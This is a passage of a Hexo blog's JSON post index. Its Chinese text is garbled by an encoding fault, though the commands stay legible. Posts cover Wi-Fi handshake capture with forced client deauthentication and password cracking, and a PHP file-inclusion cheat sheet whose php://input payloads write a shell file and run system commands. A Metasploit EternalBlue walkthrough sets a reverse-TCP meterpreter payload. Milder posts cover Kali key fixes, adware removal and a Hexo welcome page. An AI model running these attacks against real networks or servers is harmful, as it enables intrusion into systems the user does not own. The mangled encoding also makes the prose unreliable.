é™ç½‘å¡æ‰€ä»¥éœ€è¦è´­ä¹°kaliæ”¯æŒçš„ç½‘å¡ï¼Œåšä¸»ä¹°çš„æ˜¯RT3070LèŠ¯ç‰‡ç»„çš„ç½‘å¡ï¼ŒæŸå®ä¸Šé¢æ— å£³çš„åªè¦20å…ƒï¼ŒåŠ å£³æ‰25å…ƒã€‚ åœ¨kaliä¸­å¿…é¡»è¯†åˆ«å‡ºç½‘å¡ï¼Œä½¿ç”¨ifconfigæŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼Œwlan0ä¸ºæ— çº¿ç½‘å¡ã€‚ æ”»å‡»å‡†å¤‡é˜¶æ®µï¼šå¼€å¯ç½‘å¡ç›‘å¬æ¨¡å¼ï¼šairmon-ng start wlan0 å¦‚æœæˆåŠŸçš„è¯ï¼Œç½‘å¡åç§°ä¼šå˜æˆwlan0mon æ‰«æçƒ­ç‚¹ï¼šairodump-ng wlan0mon å¯ä»¥çœ‹åˆ°å¦‚å›¾ä¿¡æ¯[ æŠ“æ¡æ‰‹åŒ…ï¼šcä»£è¡¨ä¿¡é“ï¼Œbssidä¸ºmacåœ°å€ï¼Œwå‚æ•°æŒ‡çš„æ˜¯æŠ“åˆ°çš„åŒ…æ”¾çš„ç›®å½•ä»¥åŠåŒ…çš„åå­—ã€‚ airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root -c é€‰æ‹©ä¿¡é“ï¼Œå¯¹åº”ä¸Šå›¾CH --bssid éœ€è¦ç ´è§£çš„wifiçš„macåœ°å€ -w capæ–‡ä»¶ååŠè·¯å¾„ wlan0mon å¯ç”¨ç›‘å¬æ¨¡å¼çš„ç½‘å¡å å½“æœ‰äººè¿æ¥æ—¶å°±èƒ½æŠ“åˆ°æ¡æ‰‹åŒ…ã€‚ å¦‚æœå¯¹é¢éƒ½åœ¨ä½¿ç”¨wifiï¼Œæ²¡äººè¿æ¥æ€ä¹ˆåŠï¼Ÿé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ–­å¼€è®¾å¤‡ä¸WiFiçš„è¿æ¥ aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon -0 deathï¼ˆå¼ºåˆ¶ä¸‹çº¿æ¨¡å¼ï¼‰ï¼Œ20ä¸ºæ‰§è¡Œæ¬¡æ•° -c è¢«æ–­ç½‘çš„å®¢æˆ·æœºMAC -a WIFIçƒ­ç‚¹çš„mac æŠ“åŒ…æˆåŠŸåç™½åœˆå‡ºç°ä¿¡æ¯ã€‚ çˆ†ç ´ï¼škaliï¼šåˆ©ç”¨aircrack-ngå‘½ä»¤ aircrack-ng -w å­—å…¸ æ¡æ‰‹åŒ… cpuè·‘è¿™ä¸ªç ´è§£é€Ÿåº¦æœ‰äº›æ…¢ã€‚ windowsï¼šç¥å™¨1ï¼šEWSAï¼Œç„¶è€Œ7.xç‰ˆæœ¬è™½ç„¶æ”¯æŒgpuåŠ é€Ÿï¼Œç„¶è€Œæ²¡æœ‰ç ´è§£ç‰ˆè½¯ä»¶ï¼Œåªèƒ½æŸ¥çœ‹å¯†ç å‰ä¸¤ä½ï¼Œæ”¶è´¹299$(è´µæ­»äºº) ç¥å™¨2ï¼šoclHashcatï¼Œä½¿ç”¨æ–¹æ³•æœ‰äº›å¤æ‚ï¼Œæ˜¯ä¸€ä¸ªwinä¸‹é¢çš„ä½¿ç”¨å‘½ä»¤è¡Œçš„å·¥å…·ï¼Œç ´è§£é€Ÿåº¦ååˆ†å¯è§‚ã€‚æœ‰å›½äººå¼€å‘äº†ä¸­æ–‡ç‰ˆçš„UIï¼Œå‡å°‘äº†ä½¿ç”¨æˆæœ¬ï¼Œé“¾æ¥ï¼šHashcatGUI_cn â€“ HashcatGUI ä¸­æ–‡ç‰ˆ","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´å¸¸ç”¨å‘½ä»¤","slug":"æ–‡ä»¶åŒ…å«æ¼æ´å¸¸ç”¨å‘½ä»¤","date":"2018-04-09T08:56:35.000Z","updated":"2019-08-19T03:01:02.385Z","comments":true,"path":"2018/04/09/æ–‡ä»¶åŒ…å«æ¼æ´å¸¸ç”¨å‘½ä»¤/","link":"","permalink":"http://yoursite.com/2018/04/09/æ–‡ä»¶åŒ…å«æ¼æ´å¸¸ç”¨å‘½ä»¤/","excerpt":"ä¸»è¦åŒ…å«å½¢å¼1.åŒ…å«æœ¬åœ°æ–‡ä»¶payloadï¼š","text":"ä¸»è¦åŒ…å«å½¢å¼1.åŒ…å«æœ¬åœ°æ–‡ä»¶payloadï¼š ?page=C:\\oneword ?file=C:\\boot.iniï¼ˆWindowsæŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼‰ ?file=C:\\WindowsSystem32inetsrvMetaBase.xmlï¼ˆWindowsæŸ¥çœ‹IISé…ç½®æ–‡ä»¶) 2.åŒ…å«è¿œç¨‹æ–‡ä»¶payloadï¼š ?url=http://www.bbb.com/2.txt ?url=[http|https|ftp]://www.bbb.com/2.txtï¼ˆå¯ä»¥æœ‰ä¸‰ç§ï¼Œhttpã€httpsã€ftpï¼‰ 3.ä¼ªåè®®1) php://input è¯´æ˜ï¼š ç”¨æ¥æ¥æ”¶POSTæ•°æ®ã€‚æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡inputæŠŠæˆ‘ä»¬çš„è¯­å¥è¾“å…¥ä¸Šå»ç„¶åæ‰§è¡Œã€‚ æ¡ä»¶ï¼š php &lt;5.0 ï¼Œallow_url_include=Off æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç”¨ php &gt; 5.0ï¼Œåªæœ‰åœ¨allow_url_fopen=On æ—¶æ‰èƒ½ä½¿ç”¨ ç”¨ä¾‹1 å¢åŠ ä¸€å¥è¯ï¼š URLï¼š http://localhost/include/file.php?file=php://input POSTï¼š &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt; ç”¨ä¾‹2 å¢åŠ æ–‡ä»¶ï¼š URLï¼šhttp://localhost/include/file.php?file=php://inputPOSTï¼š&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;è¿™é‡Œfopenå‚æ•°ä¸ºwï¼Œå¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶ã€‚ ç”¨ä¾‹3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š URLï¼šhttp://localhost/include/file.php?file=php://inputPOSTï¼š&lt;?php system(&#39;ipconfig&#39;);?&gt; 2)data:// è¯´æ˜ï¼š è¿™æ˜¯ä¸€ç§æ•°æ®æµå°è£…å™¨ï¼Œdata:URI schema(URL schemaå¯ä»¥æ˜¯å¾ˆå¤šå½¢å¼) åˆ©ç”¨data://ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œphp://æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†PHPä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ æ¡ä»¶ï¼š allow_url_include=Onphp &gt; 5.2 3)php://filter è¯´æ˜ï¼š è¿™ä¸ªè¯­å¥ç”¨æ¥æŸ¥çœ‹æºç ã€‚ç›´æ¥åŒ…å«phpæ–‡ä»¶æ—¶ä¼šè¢«è§£æï¼Œä¸èƒ½çœ‹åˆ°æºç ï¼Œæ‰€ä»¥ç”¨filteræ¥è¯»å–ï¼Œä¸è¿‡è¦å…ˆbase64åŠ å¯†ä¼ è¾“è¿‡æ¥ï¼š ?page=php://filter/read=convert.base64-encode/resource=php.ini è®¿é—®ä¸Šè¿°URLåä¼šè¿”å›config.phpä¸­ç»è¿‡Base64åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œè§£å¯†å³å¯å¾—åˆ°æºç  payload: http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php èµ„æ–™æ¥æºï¼šhttps://www.anquanke.com/post/id/86123","categories":[],"tags":[]},{"title":"æ‰“é€ æ‰‹æœºæ¸—é€ç¥å™¨kali-linux-nethunterå®‰è£…","slug":"æ‰“é€ æ‰‹æœºæ¸—é€ç¥å™¨kali-linux-nethunterå®‰è£…","date":"2018-03-10T04:59:57.000Z","updated":"2019-08-19T03:01:07.303Z","comments":true,"path":"2018/03/10/æ‰“é€ æ‰‹æœºæ¸—é€ç¥å™¨kali-linux-nethunterå®‰è£…/","link":"","permalink":"http://yoursite.com/2018/03/10/æ‰“é€ æ‰‹æœºæ¸—é€ç¥å™¨kali-linux-nethunterå®‰è£…/","excerpt":"ä¸€åŠ 1ï¼ˆbaconï¼‰ Kali Nethunterå®‰è£…æŒ‡å—å‡†å¤‡å·¥ä½œ å‡†å¤‡ä¸€åŠ ä¸€æ‰‹æœº è§£é”å¹¶åˆ·åˆ°CM12å¹¶ä¸”å¼€è¿‡ä¸€æ¬¡æœºï¼ˆæˆ‘ç”¨é­”è¶£ä¹Ÿèƒ½æˆåŠŸï¼Œç†è®ºä¸Šæ¥è¯´ä»»æ„6.0éƒ½è¡Œï¼‰ åˆ·å¥½TWRP recovery","text":"ä¸€åŠ 1ï¼ˆbaconï¼‰ Kali Nethunterå®‰è£…æŒ‡å—å‡†å¤‡å·¥ä½œ å‡†å¤‡ä¸€åŠ ä¸€æ‰‹æœº è§£é”å¹¶åˆ·åˆ°CM12å¹¶ä¸”å¼€è¿‡ä¸€æ¬¡æœºï¼ˆæˆ‘ç”¨é­”è¶£ä¹Ÿèƒ½æˆåŠŸï¼Œç†è®ºä¸Šæ¥è¯´ä»»æ„6.0éƒ½è¡Œï¼‰ åˆ·å¥½TWRP recovery å®˜ç½‘ä¸‹è½½åˆ·æœºåŒ… å¤œç‰ˆï¼ˆnightlyï¼‰ åˆ·æœºåŒ…æœ¬ä½“ï¼š https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip å†…æ ¸ï¼š 6.0 https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip æ­£å¼ç‰ˆï¼ˆå¼ºçƒˆæ¨èï¼‰ åˆ·æœºåŒ…æœ¬ä½“ï¼š https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip åˆ·æœº åƒä¸‡åˆ«åŒæ¸…ï¼Œåƒä¸‡åˆ«åŒæ¸…ï¼Œåƒä¸‡åˆ«åŒæ¸…ï¼ˆå¦‚æœdateè¢«æ¸…äº†ä¼šåˆ·å†™å¤±è´¥ï¼‰ å¡åˆ·åˆ·æœºåŒ…æœ¬ä½“ï¼ˆæ­£å¼ç‰ˆï¼‰ ï¼ˆå¦‚æœæ˜¯å¤œç‰ˆå…ˆåˆ·å†…æ ¸å†åˆ·åˆ·æœºåŒ…æœ¬ä½“ï¼‰","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"è®°ä¸€æ¬¡è§£å†³æŸç½‘ç«™é«˜é€Ÿä¸‹è½½ç—…æ¯’","slug":"è®°ä¸€æ¬¡è§£å†³æŸç½‘ç«™é«˜é€Ÿä¸‹è½½ç—…æ¯’","date":"2018-02-11T03:19:04.000Z","updated":"2019-08-19T03:01:11.640Z","comments":true,"path":"2018/02/11/è®°ä¸€æ¬¡è§£å†³æŸç½‘ç«™é«˜é€Ÿä¸‹è½½ç—…æ¯’/","link":"","permalink":"http://yoursite.com/2018/02/11/è®°ä¸€æ¬¡è§£å†³æŸç½‘ç«™é«˜é€Ÿä¸‹è½½ç—…æ¯’/","excerpt":"æ€’è‰æµæ°“è½¯ä»¶åœ¨æŸç½‘ç«™ä¸Šä¸‹è½½è½¯ä»¶ï¼Œä¸å°å¿ƒç”¨äº†é«˜é€Ÿä¸‹è½½ï¼Œç„¶åå°±è¢«å®‰è£…äº†æµæ°“è½¯ä»¶ã€‚å¤©å¤©å¼€æœºå¼¹å¹¿å‘Šï¼Œè¿˜ä¸æ˜¯å¯åŠ¨é¡¹ï¼Œé€šè¿‡è¿›ç¨‹åˆ æ‰æµæ°“è½¯ä»¶åæ¯æ¬¡å¼€æœºå‡ºç°explorer.exeè­¦å‘Šï¼Œåœ¨ç½‘ä¸Šæœç´¢åæ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚","text":"æ€’è‰æµæ°“è½¯ä»¶åœ¨æŸç½‘ç«™ä¸Šä¸‹è½½è½¯ä»¶ï¼Œä¸å°å¿ƒç”¨äº†é«˜é€Ÿä¸‹è½½ï¼Œç„¶åå°±è¢«å®‰è£…äº†æµæ°“è½¯ä»¶ã€‚å¤©å¤©å¼€æœºå¼¹å¹¿å‘Šï¼Œè¿˜ä¸æ˜¯å¯åŠ¨é¡¹ï¼Œé€šè¿‡è¿›ç¨‹åˆ æ‰æµæ°“è½¯ä»¶åæ¯æ¬¡å¼€æœºå‡ºç°explorer.exeè­¦å‘Šï¼Œåœ¨ç½‘ä¸Šæœç´¢åæ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚ åœ¨æ³¨å†Œè¡¨HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windowsé‡Œèƒ½æ‰¾åˆ°å’Œæµæ°“è½¯ä»¶å¯¹åº”åœ°å€çš„ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ï¼Œåˆ é™¤æ­¤é¡¹ï¼Œé‡å¯ï¼Œé—®é¢˜è§£å†³ã€‚","categories":[],"tags":[{"name":"ç—…æ¯’","slug":"ç—…æ¯’","permalink":"http://yoursite.com/tags/ç—…æ¯’/"}]},{"title":"kaliæ›´æ–°æºé—®é¢˜è§£å†³æ–¹æ¡ˆ","slug":"kaliæ›´æ–°æºé—®é¢˜è§£å†³æ–¹æ¡ˆ","date":"2018-02-06T04:17:06.000Z","updated":"2019-08-19T03:01:20.656Z","comments":true,"path":"2018/02/06/kaliæ›´æ–°æºé—®é¢˜è§£å†³æ–¹æ¡ˆ/","link":"","permalink":"http://yoursite.com/2018/02/06/kaliæ›´æ–°æºé—®é¢˜è§£å†³æ–¹æ¡ˆ/","excerpt":"æ›´æ¢aptæºåæ˜¾ç¤ºGPGé”™è¯¯ ç­¾åæ— æ•ˆç­‰é—®é¢˜æè¿°Kali Linuxç”±äºå¤ªé•¿æ—¶é—´æœªæ›´æ–°ï¼Œè€Œå‡ºç°GPGé”™è¯¯ KEYEXPIRED 1425567400ã€‚ç»æ£€æŸ¥æºæœªå‡ºç°é—®é¢˜å¯ä»¥è§£æï¼Œdebä¹Ÿä¸å†²çªï¼Œå°±æ˜¯å¯†é’¥è¿‡æœŸäº†!","text":"æ›´æ¢aptæºåæ˜¾ç¤ºGPGé”™è¯¯ ç­¾åæ— æ•ˆç­‰é—®é¢˜æè¿°Kali Linuxç”±äºå¤ªé•¿æ—¶é—´æœªæ›´æ–°ï¼Œè€Œå‡ºç°GPGé”™è¯¯ KEYEXPIRED 1425567400ã€‚ç»æ£€æŸ¥æºæœªå‡ºç°é—®é¢˜å¯ä»¥è§£æï¼Œdebä¹Ÿä¸å†²çªï¼Œå°±æ˜¯å¯†é’¥è¿‡æœŸäº†! è§£å†³æ–¹æ³•å…·ä½“æ›´æ–°æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼šï¼ˆä»»é€‰ä¸€ç§å³å¯ï¼‰ 1ã€# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6 2ã€# wget -q -O - archive.kali.org/archive-key.asc | apt-key add 3ã€# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6 # gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add - 4ã€# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb # apt install ./kali-archive-keyring_2018.1_all.deb æˆåŠŸæ›´æ–°å¯†é’¥ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸çš„ update / upgrade äº†ã€‚ ç„¶ååœ¨æ‰§è¡Œ1apt-get update å³å¯ã€‚","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"çæçš„ä¸€æ¬¡ms17-0100æ¼æ´åˆ©ç”¨","slug":"çæçš„ä¸€æ¬¡ms17-0100æ¼æ´åˆ©ç”¨","date":"2018-01-18T02:22:42.000Z","updated":"2019-08-19T03:01:29.009Z","comments":true,"path":"2018/01/18/çæçš„ä¸€æ¬¡ms17-0100æ¼æ´åˆ©ç”¨/","link":"","permalink":"http://yoursite.com/2018/01/18/çæçš„ä¸€æ¬¡ms17-0100æ¼æ´åˆ©ç”¨/","excerpt":"MS17-010å‰ææ¡ä»¶ï¼šgem install ruby_smbâ€”-ruby_smbæ¨¡å—å®‰è£…msfupdateâ€”-msfçš„æ›´æ–°msfconsole -qx â€œuseexploit/windows/smb/ms17_010_eternalblueâ€â€”-å¯åŠ¨å¹¶åŠ è½½æ¨¡å—","text":"MS17-010å‰ææ¡ä»¶ï¼šgem install ruby_smbâ€”-ruby_smbæ¨¡å—å®‰è£…msfupdateâ€”-msfçš„æ›´æ–°msfconsole -qx â€œuseexploit/windows/smb/ms17_010_eternalblueâ€â€”-å¯åŠ¨å¹¶åŠ è½½æ¨¡å— éƒ¨ç½²ç¯å¢ƒï¼š msfconsole wget https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb å¼€å§‹æ”»å‡»: msfconsole use exploit/windows/smb/ms17_010_eternalblue set rhost 192.168.21.128 set lhost 192.168.21.131 set payload windows/x64/meterpreter/reverse_tcp exploit shell","categories":[],"tags":[]},{"title":"æ­å»ºä¸ªäººåšå®¢","slug":"æ­å»ºä¸ªäººåšå®¢","date":"2018-01-16T05:21:52.000Z","updated":"2019-08-19T03:01:36.759Z","comments":true,"path":"2018/01/16/æ­å»ºä¸ªäººåšå®¢/","link":"","permalink":"http://yoursite.com/2018/01/16/æ­å»ºä¸ªäººåšå®¢/","excerpt":"ç¬¬ä¸€æ¬¡å°è¯•","text":"ç¬¬ä¸€æ¬¡å°è¯• 2018/1/16ç»è¿‡ä¸¤å¤©çš„å°è¯•ï¼Œç»ˆäºæˆåŠŸåœ°åœ¨Githubä¸Šé¢æ­å»ºäº†åšå®¢ã€‚","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2018-01-15T14:52:42.245Z","updated":"2018-01-15T14:52:42.245Z","comments":true,"path":"2018/01/15/hello-world/","link":"","permalink":"http://yoursite.com/2018/01/15/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}